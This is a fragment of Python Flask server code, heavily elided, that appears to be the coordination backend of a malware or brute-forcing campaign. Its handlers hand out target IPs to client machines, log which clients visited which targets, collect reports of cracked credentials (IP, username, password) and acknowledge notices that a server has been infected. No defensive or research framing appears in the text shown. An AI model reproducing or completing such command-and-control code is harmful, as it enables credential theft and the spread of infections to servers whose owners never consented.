...
def notify_credentials_found(credentials_data):
    try:
        ...
        print(
            f"Credentials found: IP - {ip}, Username - {username}, Password - {password}"
        )
        ...
        return jsonify(
            {"status": "success", "message": "Credentials found notification received"}
        )
    except Exception as e:
        print(f"Error notifying credentials found: {str(e)}")
        return jsonify(
            {"status": "error", "message": "Error notifying credentials found"}
        )
...
def get_target_route():
    ...
    if target:
        ...
        ip_visits_collection.insert_one(
            {"client_ip": client_ip, "ip": target.ip, "timestamp": timestamp}
        )

    return (
        jsonify(target.as_dict())
        if target
        else jsonify({"status": "error", "message": "No more targets"})
    )
    ...
    try:
        ...
        if success:
            return jsonify(
                {
                    "status": "success",
                    "message": "Infected server notification received",
                }
            )
        else:
            return jsonify(
                {"status": "error", "message": "Error notifying infected server"}
            )
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})
